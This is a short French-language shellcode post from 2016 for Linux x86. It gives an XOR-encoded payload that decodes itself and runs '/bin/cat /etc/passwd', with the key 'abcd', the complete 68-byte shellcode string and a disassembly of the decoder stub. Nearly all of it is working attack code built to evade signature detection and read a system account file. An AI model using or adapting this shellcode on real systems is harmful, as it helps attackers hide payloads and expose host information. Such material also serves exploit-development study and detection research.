---------------------------------
Xor decode shellcode
---------------------------------

By Xophidia - 2016
Platform: Linux / x86

Le shellcode utilisant /bin/cat /etc/passwd a été xor(é) avec la clé "abcd".
Il est ensuite decodé puis executé.
La clé est en clair ce qui sera à modifier !!


Shellcode encodé :
------------------
0x50,0xa2,0x33,0x0c,0x4e,0x01,0x02,0x10,0x09,0x4d,0x01,0x0d,0x0f,0xeb,0x80,0x34,0x09,0x11,0x10,0x13,0x05,0x0a,0x4c,
0x4b,0x11,0x03,0x0b,0x4b,0x04,0x16,0x00,0xed,0x80,0x32,0x32,0x37,0xe8,0x83,0xd3,0x6f,0xac,0xe2

clé:
----
0x61,0x62,0x63,0x64

Shellcode final :
-----------------
Length: 68

"\xeb\x1b\x5e\x8d\x7e\x04\x31\xc9\xb1\x2a\x31\xc0\x31\xdb\x8b\x07\x8b\x1e\x31\xd8\x89\x07"
"\x83\xc7\x04\xe2\xef\xeb\x09\xe8\xe0\xff\xff\xff\x61\x62\x63\x64\x50\xa2\x33\x0c\x4e\x01"
"\x02\x10\x09\x4d\x01\x0d\x0f\xeb\x80\x34\x09\x11\x10\x13\x05\x0a\x4c\x4b\x11\x03\x0b\x4b"
"\x04\x16\x00\xed\x80\x32\x32\x37\xe8\x83\xd3\x6f\xac\xe2"

Code :
------
  eb 1b                	jmp    0x804807d
	5e                   	pop    esi
	8d 7e 04             	lea    edi,[esi+0x4]
	31 c9                	xor    ecx,ecx
	b1 2a                	mov    cl,0x2a
	31 c0                	xor    eax,eax
	31 db                	xor    ebx,ebx
	8b 07                	mov    eax,DWORD PTR [edi]
	8b 1e                	mov    ebx,DWORD PTR [esi]
	31 d8                	xor    eax,ebx
	89 07                	mov    DWORD PTR [edi],eax
	83 c7 04             	add    edi,0x4
	e2 ef                	loop   0x804806a
	eb 09                	jmp    0x8048086
	e8 e0 ff ff ff       	call   0x8048062
	--------------------------------------------------------
	Key
	--------------------------------------------------------
	61                   	popa   
	62 63 64             	bound  esp,QWORD PTR [ebx+0x64]
	--------------------------------------------------------
	Shellcode encodé
	--------------------------------------------------------
	50                   	push   eax
	a2 33 0c 4e 01       	mov    ds
	02 10                	add    dl,BYTE PTR [eax]
	09 4d 01             	or     DWORD PTR [ebp+0x1],ecx
	0d 0f eb 80 34       	or     eax,0x3480eb0f
	09 11                	or     DWORD PTR [ecx],edx
	10 13                	adc    BYTE PTR [ebx],dl
	05 0a 4c 4b 11       	add    eax,0x114b4c0a
	03 0b                	add    ecx,DWORD PTR [ebx]
	4b                   	dec    ebx
	04 16                	add    al,0x16
	00 ed                	add    ch,ch
	80 32 32             	xor    BYTE PTR [edx],0x32
	37                   	aaa    
	e8 83 d3 6f ac       	call   0xb4745432
	e2                   	.byte 0xe2

